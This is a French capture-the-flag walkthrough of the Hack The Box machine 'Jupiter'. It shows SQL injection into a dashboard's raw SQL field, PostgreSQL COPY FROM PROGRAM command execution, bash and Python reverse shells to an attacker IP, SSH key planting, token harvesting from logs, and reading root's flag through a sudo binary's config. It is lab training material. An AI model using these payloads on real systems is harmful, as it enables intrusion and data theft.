  # Jupiter

	echo "10.10.11.216 jupiter.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.216 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.216 -oN nmap.txt
	feroxbuster --silent -u http://jupiter.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
 

Aucun contenu intéressant dans le site web lui-même.

Fuzzing supplémentaire : 

	ffuf -H "Host: FUZZ.jupiter.htb" -u http://jupiter.htb -w  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 178

On trouve un sous-domaine **kiosk.jupiter.htb** :

	echo "10.10.11.216 kiosk.jupiter.htb" >> /etc/hosts

Ce sous-domaine amène sur la page http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d qui permet de consulter des informations sur les lunes de différentes planètes. 
	
En rechargeant la page ou en observant l'historique HTTP de Burp, on peut voir que des requêtes POST sont exécutées vers une API. 
Ces requêtes contiennent du SQL : 

> {
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 449
    }
  ],
  "range": {
    "from": "2023-10-14T05:46:45.991Z",
    "to": "2023-10-14T11:46:45.991Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1697262405991",
  "to": "1697284005991"
}

On peut facilement exécuter nos propres requêtes SQL en modifiant le champ **rawSql** : 

	SELECT version()
	SELECT current_database()
	SELECT table_name FROM information_schema.tables
	SELECT * FROM pg_user
	[...]
	
Rien d'intéressant dans les données elles-mêmes, mais il reste la possibilité d'exécuter des commandes, voir : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution 

	DROP TABLE IF EXISTS cmd_exec;       
	CREATE TABLE cmd_exec(cmd_output text);
	COPY cmd_exec FROM PROGRAM ''; 
	SELECT * FROM cmd_exec;
	...
	COPY cmd_exec FROM PROGRAM 'cat /etc/passwd'; 
	SELECT * FROM cmd_exec;
	COPY cmd_exec FROM PROGRAM 'ls -la /home'; 
	SELECT * FROM cmd_exec;

Pas possible de récupérer les clés SSH. On s'oriente donc vers un reverse-shell. Les chevrons et les & sont encodés par le site et un bon nombre de payloads classiques ne fonctionnent pas. 
Rajouter **"bash -c"** semble donner plus de chances de succès : 

	COPY cmd_exec FROM PROGRAM 'bash -c \"sh -i >& /dev/tcp/10.10.16.19/9999 0>&1 \"' 
	SELECT * FROM cmd_exec;
	...
	rlwrap nc -nvlp 9999
	python3 -c "import pty ; pty.spawn('/bin/bash')"

On a bien un reverse-shell en tant que l'utilisateur **"postgres"**.


## Pivoting

	find / -perm /4000 2>/dev/null

On remarque un shell dans /tmp/ :

> /tmp/bash

Après vérification, il appartient à l'utilisateur **"juno"** et on peut donc l'utiliser pour exécuter des commandes avec son identité : 

	/tmp/bash -p
	whoami
	cd /home/juno/.ssh/
	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/QynVuI4143Oi8ekXSt5XCejotVvbCo4xpDDmCi1mJ8DTpEShcB4OUnBFLfFd  JZqDuBrV5p2qDPV68m0XZinrrGgJwOwj3KOQcL1wu2A6qfEALEZGCOSDqvU2iABwtoS5xbbv8Q7Y9SzJ2JTlFIIjaCf0QYeMQDN5yYjFIvRjSl/OnQVK  6fkpIDg2glSe3pWLh//qgZp21sBokvtZbbhAeemCQhfh5Kou6hoZ68m+7TgYLx47q4HNWmKPwcnoQlnffDj+BfKQaPW8QNF00WBT2lEbRDyjRjgdxWMZcMSBajWhdCjCu6mupwxURh9Pa+1OXLyRvU0KFjXuDugPLoufywjImlpdapg0qIO8TEb3e1Jhk/91Vt4czP1ikX7s7DymlwDWbohXWJunLIIs92VaEs0  17FO2wc9qTojVZ163o3/6h7PbdEp5R/wbt/jjV6GeSs9FC6umUTHc/FNMceFL2WSV32UCps0LxWkzSFoIlpZHBBNkGiQQ7cREmmC1gU= timothe@Kali2021" > ma_clé_publique.txt
	cat ma_clé_publique.txt >> authorized_keys

	ssh juno@10.10.11.216
	cat user.txt	 

Premier flag OK.

	netstat -pentula 


> <br>tcp 0 0 127.0.0.1:5432 0.0.0.0:* LISTEN 114 32962 -  
> <br>tcp 0 0 127.0.0.1:8888 0.0.0.0:* LISTEN 1001 32997 -  
><br>tcp 0 0 127.0.0.1:3000 0.0.0.0:* LISTEN 115 33912 -  
><br>tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 102 29577 -  
><br>tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 0 33821 -

D'après /etc/passwd l'utilisateur numéro 1001 est "jovian" et c'est le seul autre utilisateur à avoir un dossier dans /home, ce qui m'amène à penser que ce service interne est sûrement la prochaine étape pour l'élévation de privilèges. On doit donc établir un tunnel de redirection vers ce port pour le fouiller : 

	ssh -L 8888:127.0.0.1:8888 -i ~/.ssh/id_rsa juno@10.10.11.216
	firefox http://127.0.0.1:8888/
	
On tombe sur un site Jupyter Notebook qui demande un password / token. En fouillant dans les principaux dossiers du serveur, on voit qu'il y a dossier **opt/solar-flares/** contenant un fichier **.ipynb** (extension de Jupyter Notebook). Ce dossier contient aussi beaucoup de logs, contenant des tokens notamment : 

	cd /opt/solar-flares/logs
	cat *
	cat * | grep token 

Prendre n'importe quel token et le rentrer sur le site web. On peut maintenant modifier les fichiers, et inclure un reverse-shell Python dans le fichier .ipynb déjà existant par exemple : 

	import socket,subprocess,os;
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
	s.connect(("10.10.16.19",9999));
	os.dup2(s.fileno(),0); 
	os.dup2(s.fileno(),1);
	os.dup2(s.fileno(),2);
	import pty; pty.spawn("sh")

Cliquer sur "Run" et attendre le reverse-shell de Jovian sur un listener : 

	rlwrap  nc  -nvlp 9999
	...
	whoami 
	python3 -c "import pty ; pty.spawn('/bin/bash')"
	

## Élévation de privilèges

	sudo -l 

> User jovian may run the following commands on jupiter:  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(ALL) NOPASSWD: /usr/local/bin/sattrack

	ls -l /usr/local/bin/sattrack

> -rwxr-xr-x 1 root root 1113632 Mar 8 2023 /usr/local/bin/sattrack

Impossible d'écrire dans ce binaire, mais on peut trouver des informations intéressantes dedans : 

	strings /usr/local/bin/sattrack | less

On trouve un morceau très intéressant : 

> /tmp/config.json  
<br>Configuration file has not been found. Please try again!  
<br>tleroot  
<br>tleroot not defined in config

	find / -name "config.json" 2>/dev/null
	cp /usr/local/share/sattrack/config.json /tmp/config.json
	cd /tmp/
	cat config.json

On voit que ce fichier de configuration récupère des ressources depuis des URL de sites web : 

	

> "tlesources": [  
<br>"http://celestrak.org/NORAD/elements/weather.txt",  
<br>"http://celestrak.org/NORAD/elements/noaa.txt",  
<br>"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"  
],

En remplaçant une de ces URL par **"file:///root/root.txt"** on peut directement récupérer le flag : 

	chmod 777 /tmp/config.json
	vi /tmp/config.json # Avec Juno, qui a un shell plus stable
	sudo /usr/local/bin/sattrack # Avec Jovian
	
Le programme s'exécute bien et on voit qu'il sort des résultats dans /tmp/ :

	ls /tmp
	ls /tmp/tle
	cat /tmp/tle/root.txt

